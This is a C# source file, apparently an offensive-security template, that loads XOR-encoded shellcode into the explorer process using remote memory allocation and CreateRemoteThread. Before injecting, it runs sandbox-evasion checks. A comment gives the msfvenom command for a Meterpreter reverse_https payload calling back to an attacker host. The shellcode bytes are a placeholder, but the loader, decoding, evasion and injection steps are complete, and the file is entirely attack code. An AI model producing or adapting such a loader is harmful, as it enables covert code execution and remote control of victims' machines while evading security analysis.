using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]

public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint
   flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[]
   lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint
   dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr
   lpThreadId);
    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    public TestClass()
    {
        // Sandbox evasion
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return;
        }
        DateTime t1 = DateTime.Now;
        Sleep(10000);
        double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
        if (deltaT < 9.5)
        {
            return;
        }


        // Xor-encoded payload, key 0xfa
        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f csharp --encrypt xor --encrypt-key "\xfa"
        byte[] buf = new byte[748] { shellcodeHere };

        // Decode the payload
        for (int j = 0; j < buf.Length; j++)
        {
            buf[j] = (byte)((uint)buf[j] ^ 0xfa);
        }
        int len = buf.Length;


        // Get a handle on target process
        Process[] expProc = Process.GetProcessesByName("explorer");
        int pid = expProc[0].Id;
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);


        // Allocate memory in the remote process
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, 0x3000, 0x40);


        // Write the payload to the allocated bytes
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);


        // Trigger the payload
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}